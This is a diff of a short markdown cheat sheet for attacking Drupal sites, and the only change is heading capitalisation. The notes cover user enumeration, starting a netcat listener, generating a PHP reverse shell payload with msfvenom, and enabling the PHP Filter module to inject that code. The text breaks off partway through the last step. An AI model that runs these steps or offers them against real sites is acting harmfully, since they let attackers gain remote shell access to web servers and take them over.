@@ -1,24 +1,24 @@
-### user enum
+### User enum
 ```
 <domain>/user/register
 ```
 
-### get number of existing user
+### Get number of existing user
 ```
 /users/<number>
 ```
 
-### start listener
+### Start listener
 ```
 nc -lvp <lport>
 ```
 
-### create php reverse shell
+### Create php reverse shell
 ```
 msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw
 ```
 
-### insert PHP code into Drupal
+### Insert PHP code into Drupal
 ```
 /modules/php
 Modules > (Check) PHP Filter > Save configuration
